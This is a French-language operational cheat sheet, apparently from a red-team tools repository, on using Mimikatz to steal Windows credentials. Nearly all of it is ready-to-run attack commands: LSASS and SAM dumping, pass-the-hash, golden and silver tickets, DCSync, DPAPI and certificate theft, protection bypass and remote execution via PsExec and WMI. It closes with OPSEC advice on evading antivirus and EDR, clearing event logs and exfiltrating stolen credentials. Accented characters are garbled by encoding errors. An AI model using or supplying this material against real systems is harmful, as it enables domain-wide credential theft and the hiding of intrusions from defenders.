# Mimikatz - Extraction de Credentials Windows

## üóÇÔ∏è Workflow d'utilisation Mimikatz
1. √âl√©vation des privil√®ges (SeDebugPrivilege)
   ‚Üì
2. Extraction des credentials en m√©moire (LSASS)
   ‚Üì
3. Dump des hashes stock√©s (SAM, LSA secrets)
   ‚Üì
4. Extraction des tickets Kerberos (Golden/Silver)
   ‚Üì
5. Pass-the-Hash et Pass-the-Ticket
   ‚Üì
6. Nettoyage des traces et OPSEC

## üìã Vue d'ensemble

Mimikatz est l'outil de r√©f√©rence pour l'extraction de credentials Windows en exploitant les m√©canismes d'authentification du syst√®me. Il peut r√©cup√©rer des mots de passe en clair, des hashes NTLM, et manipuler les tickets Kerberos.

> **üí° Explication Simple** : C'est comme un passe-partout num√©rique qui peut ouvrir le coffre-fort de Windows o√π sont stock√©s tous les mots de passe et cl√©s d'authentification.

## ‚ö° Commandes Essentielles

### Pr√©paration et privil√®ges
```cmd
# Lancement avec privil√®ges admin
mimikatz.exe

# Activation du debug privilege
privilege::debug

# Test des privil√®ges
token::whoami
```

### Extraction LSASS (m√©moire)
```cmd
# Dump complet LSASS
sekurlsa::logonpasswords

# Credentials par package
sekurlsa::wdigest
sekurlsa::kerberos  
sekurlsa::tspkg
sekurlsa::livessp

# Tickets Kerberos
sekurlsa::tickets
```

### Dump hashes syst√®me
```cmd
# Dump SAM (local accounts)
lsadump::sam

# LSA secrets
lsadump::secrets

# Cache de credentials
lsadump::cache
```

## üéØ Techniques d'Extraction Avanc√©es

### Pass-the-Hash (PTH)
```cmd
# PTH avec hash NTLM
sekurlsa::pth /user:admin /domain:company.com /ntlm:aad3b435b51404eeaad3b435b51404ee

# PTH avec processus sp√©cifique
sekurlsa::pth /user:admin /domain:company.com /ntlm:[HASH] /run:powershell.exe
```

### Pass-the-Ticket (PTT)
```cmd
# Export de tickets
sekurlsa::tickets /export

# Import de ticket
kerberos::ptt ticket.kirbi

# Purge des tickets
kerberos::purge
```

### Golden Ticket Attack
```cmd
# G√©n√©ration Golden Ticket
kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /krbtgt:[HASH] /id:500

# Golden Ticket avec groupe
kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /krbtgt:[HASH] /groups:512,513,518,519,520
```

### Silver Ticket Attack
```cmd
# Silver Ticket pour service sp√©cifique
kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /target:server.company.com /service:cifs /rc4:[HASH]

# Silver Ticket MSSQL
kerberos::golden /user:admin /domain:company.com /sid:S-1-5-21-... /target:sql.company.com /service:MSSQLSvc /rc4:[HASH]
```

## üîì Extraction par Service

### Active Directory
```cmd
# DCSync attack (r√©plication AD)
lsadump::dcsync /domain:company.com /user:krbtgt

# DCSync utilisateur sp√©cifique
lsadump::dcsync /domain:company.com /user:admin /csv

# Dump NTDS.dit
lsadump::lsa /inject /name:ntlm
```

### DPAPI (Data Protection API)
```cmd
# Masterkeys DPAPI
dpapi::masterkey /in:masterkey_file /sid:S-1-5-21-... /password:userpass

# Credentials DPAPI
dpapi::cred /in:credential_file /masterkey:[KEY]

# Dump vault
vault::list
vault::cred /patch
```

### Certificate Services
```cmd
# Export certificats
crypto::certificates /export

# Cl√©s priv√©es
crypto::keys /export

# Certificats utilisateur
crypto::certificates /systemstore:CERT_SYSTEM_STORE_CURRENT_USER /store:"My" /export
```

## üåê Techniques R√©seau

### WDigest activation
```cmd
# Activation WDigest (clear text passwords)
misc::memssp

# Via registre
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
```

### Token manipulation
```cmd
# √ânum√©ration tokens
token::list

# Impersonation token
token::impersonate /domainadmin

# √âl√©vation via token
token::elevate
```

### Processus injection
```cmd
# Injection dans processus sp√©cifique
process::suspend /pid:1234
process::resume /pid:1234

# Dump m√©moire processus
process::exports /pid:1234
```

## üé≠ Evasion et Contournements

### Bypass antivirus
```cmd
# Chargement en m√©moire uniquement
# Utilisation de PowerShell Empire
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

# Obfuscation
# Compilation custom avec modifications
```

### Techniques stealth
```cmd
# Dump LSASS indirect via ProcDump
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Analyse offline
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Protection bypass
```cmd
# PPL (Protected Process Light) bypass
!+
!processprotect /process:lsass.exe /remove

# Credential Guard bypass
# (Techniques avanc√©es n√©cessaires)
```

## üîÑ Automatisation et Scripts

### Script PowerShell
```powershell
# Script automatis√© Mimikatz
$commands = @(
    "privilege::debug",
    "sekurlsa::logonpasswords",
    "lsadump::sam",
    "exit"
)

foreach ($cmd in $commands) {
    .\mimikatz.exe $cmd
}
```

### Batch automation
```batch
@echo off
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::sam" "exit" > output.txt
```

### Remote execution
```cmd
# Via PSExec
psexec.exe \\target -s -c mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Via WMI
wmic /node:target process call create "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
```

## üìä Analyse des R√©sultats

### Format de sortie
```cmd
# Export en fichier
sekurlsa::logonpasswords full > credentials.txt

# Format CSV pour parsing
lsadump::dcsync /domain:company.com /user:admin /csv > hashes.csv
```

### Parsing credentials
```python
# Script Python pour parser sortie Mimikatz
import re

def parse_mimikatz_output(file_path):
    with open(file_path, 'r') as f:
        content = f.read()
    
    # Regex pour extraire credentials
    pattern = r'Username\s*:\s*(.+)\n.*?Password\s*:\s*(.+)\n'
    matches = re.findall(pattern, content, re.DOTALL)
    
    return matches
```

## üõ°Ô∏è Conseils OPSEC

### Minimiser la d√©tection
- Utiliser des builds obfusqu√©s ou recompil√©s de Mimikatz
- Privil√©gier l'extraction via dump LSASS offline
- √âviter l'ex√©cution directe sur disque (utiliser m√©moire)
- Nettoyer les logs d'√©v√©nements apr√®s utilisation

### Protection des credentials
- Chiffrer imm√©diatement les credentials extraits
- Utiliser des canaux s√©curis√©s pour l'exfiltration
- Supprimer les fichiers temporaires apr√®s usage
- Impl√©menter des m√©canismes de rotation des credentials

## ‚ö†Ô∏è Erreurs fr√©quentes

### Privil√®ges insuffisants
- Oublier d'activer SeDebugPrivilege
- Ex√©cuter sans privil√®ges administrateur
- Ne pas v√©rifier les protections syst√®me (Credential Guard)

### D√©tection par s√©curit√©
- Utiliser la version originale non modifi√©e
- Laisser des artefacts sur le syst√®me de fichiers
- Ne pas masquer l'activit√© dans les logs
- Ignorer les solutions EDR/XDR

## üí° Astuces

### Optimisation extraction
- Combiner plusieurs techniques d'extraction
- Utiliser DCSync sur un seul utilisateur pour √©viter le bruit
- Pr√©f√©rer les Silver Tickets aux Golden Tickets pour la discr√©tion
- Coupler avec d'autres outils (Rubeus, SharpKatz)

### Techniques alternatives
- Utiliser Pypykatz pour analyse offline
- Employer LaZagne pour credentials applications
- Combiner avec Bloodhound pour mapping AD
- Int√©grer dans frameworks C2 (Empire, Cobalt Strike)

## üîó Pour aller plus loin

- [Mimikatz Official Repository](https://github.com/gentilkiwi/mimikatz)
- [Pypykatz Alternative](https://github.com/skelsec/pypykatz)
- [Kerberos Attacks Guide](https://attack.stealthbits.com/how-golden-ticket-attack-works)
- [DPAPI Attacks](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/)

## üß≠ Navigation

- [Guide Empire](./Empire.md)
- [Guide Cobalt Strike](./Cobalt-Strike.md)
- [Retour aux outils post-exploitation](./README.md)
- [Credential Access](../Credential_Access/) 